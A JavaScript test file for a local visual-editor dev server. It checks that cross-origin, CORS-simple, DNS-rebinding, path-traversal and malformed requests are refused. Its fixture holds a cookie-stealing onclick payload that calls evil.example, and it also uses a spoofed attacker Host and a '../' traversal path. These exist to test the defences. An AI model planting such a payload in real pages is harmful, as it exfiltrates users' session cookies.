'use strict';
/**
 * HTTP-level tests — run with `npm test` (node:test, no deps).
 *
 * These cover the things the pure-patcher tests structurally cannot: request
 * authentication (a dev server that writes to disk must not be drivable by
 * another site) and crash resistance (an unhandled throw in a request handler
 * kills the whole process, not just the request).
 */
const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const { startServer } = require('../src/server.cjs');

const PAGE = [
  '<!doctype html>', '<html>', '<body>',
  '  <div id="main">hello</div>', '</body>', '</html>', '',
].join('\n');

/** Spin up a real server on an ephemeral port, run fn, always tear it down. */
async function withServer(fn) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 've-http-'));
  fs.writeFileSync(path.join(root, 'index.html'), PAGE, 'utf8');
  const server = startServer({ root, port: 0 });
  await new Promise((resolve) => server.listening ? resolve() : server.once('listening', resolve));
  const port = server.address().port;
  const base = 'http://127.0.0.1:' + port;
  const read = () => fs.readFileSync(path.join(root, 'index.html'), 'utf8');
  try {
    return await fn({ base, port, root, read });
  } finally {
    await new Promise((resolve) => server.close(resolve));
    fs.rmSync(root, { recursive: true, force: true });
  }
}

/** Raw HTTP request — needed for headers fetch() refuses to send (Host). */
function rawRequest({ port, method, path: reqPath, headers, body }) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      { host: '127.0.0.1', port, method, path: reqPath, headers: Object.assign({}, headers) },
      (res) => {
        let data = '';
        res.setEncoding('utf8');
        res.on('data', (c) => { data += c; });
        res.on('end', () => resolve({ status: res.statusCode, body: data }));
      }
    );
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

const EDIT = {
  file: 'index.html', op: 'setAttr', path: [1, 0],
  name: 'onclick', value: 'fetch("//evil.example/?"+document.cookie)',
};

test('a same-origin JSON edit is applied', async () => {
  await withServer(async ({ base, port, read }) => {
    const res = await fetch(base + '/__visual-editor/edit', {
      method: 'POST',
      headers: { 'content-type': 'application/json', origin: 'http://127.0.0.1:' + port },
      body: JSON.stringify({ file: 'index.html', op: 'setAttr', path: [1, 0], name: 'data-ok', value: '1' }),
    });
    assert.strictEqual(res.status, 200);
    assert.deepStrictEqual(await res.json(), { ok: true });
    assert.ok(read().includes('data-ok="1"'));
  });
});

test('a cross-origin edit is refused and writes nothing', async () => {
  await withServer(async ({ base, read }) => {
    const before = read();
    const res = await fetch(base + '/__visual-editor/edit', {
      method: 'POST',
      headers: { 'content-type': 'application/json', origin: 'https://evil.example' },
      body: JSON.stringify(EDIT),
    });
    assert.strictEqual(res.status, 403);
    assert.match((await res.json()).error, /cross-origin/);
    assert.strictEqual(read(), before, 'file must be byte-identical');
  });
});

test('a CORS-simple cross-site POST (text/plain, no preflight) is refused', async () => {
  // This is the shape that actually matters: text/plain skips the preflight,
  // so the browser sends it for real. The write must not land.
  await withServer(async ({ base, read }) => {
    const before = read();
    const res = await fetch(base + '/__visual-editor/edit', {
      method: 'POST',
      headers: { 'content-type': 'text/plain;charset=UTF-8', origin: 'https://evil.example' },
      body: JSON.stringify(EDIT),
    });
    assert.strictEqual(res.status, 403);
    assert.strictEqual(read(), before);
    assert.ok(!read().includes('onclick'));
  });
});

test('a POST without a JSON content-type is refused even same-origin', async () => {
  await withServer(async ({ base, port, read }) => {
    const before = read();
    const res = await fetch(base + '/__visual-editor/edit', {
      method: 'POST',
      headers: { 'content-type': 'text/plain', origin: 'http://127.0.0.1:' + port },
      body: JSON.stringify(EDIT),
    });
    assert.strictEqual(res.status, 403);
    assert.match((await res.json()).error, /application\/json/);
    assert.strictEqual(read(), before);
  });
});

test('a non-loopback Host header is refused (DNS rebinding)', async () => {
  await withServer(async ({ port, read }) => {
    const before = read();
    // fetch() cannot send this: Host is a forbidden header name and undici
    // strips it, so the check has to be exercised over a raw request.
    const res = await rawRequest({
      port,
      method: 'POST',
      path: '/__visual-editor/edit',
      headers: { 'content-type': 'application/json', host: 'attacker.example' },
      body: JSON.stringify(EDIT),
    });
    assert.strictEqual(res.status, 403);
    assert.match(JSON.parse(res.body).error, /loopback/);
    assert.strictEqual(read(), before);
  });
});

test('a loopback Host header still passes the rebinding check', async () => {
  await withServer(async ({ port, read }) => {
    const res = await rawRequest({
      port,
      method: 'POST',
      path: '/__visual-editor/edit',
      headers: { 'content-type': 'application/json', host: 'localhost:' + port },
      body: JSON.stringify({ file: 'index.html', op: 'setAttr', path: [1, 0], name: 'data-ok', value: '1' }),
    });
    assert.strictEqual(res.status, 200);
    assert.deepStrictEqual(JSON.parse(res.body), { ok: true });
    assert.ok(read().includes('data-ok="1"'));
  });
});

test('the undo route is gated the same way', async () => {
  await withServer(async ({ base }) => {
    const res = await fetch(base + '/__visual-editor/undo', {
      method: 'POST',
      headers: { 'content-type': 'application/json', origin: 'https://evil.example' },
      body: JSON.stringify({ file: 'index.html' }),
    });
    assert.strictEqual(res.status, 403);
    assert.match((await res.json()).error, /cross-origin/);
  });
});

test('a malformed percent-escape returns 400 and the server survives', async () => {
  await withServer(async ({ base }) => {
    const bad = await fetch(base + '/%');
    assert.strictEqual(bad.status, 400);
    // The real assertion: the process is still serving afterwards.
    const ok = await fetch(base + '/');
    assert.strictEqual(ok.status, 200);
    assert.ok((await ok.text()).includes('/__visual-editor/client.js'));
  });
});

test('path traversal over HTTP is refused', async () => {
  await withServer(async ({ base, port }) => {
    const res = await fetch(base + '/__visual-editor/edit', {
      method: 'POST',
      headers: { 'content-type': 'application/json', origin: 'http://127.0.0.1:' + port },
      body: JSON.stringify({ file: '../escape.html', op: 'setAttr', path: [1, 0], name: 'x', value: '1' }),
    });
    const body = await res.json();
    assert.strictEqual(body.ok, false);
    assert.match(body.error, /escapes root/);
  });
});
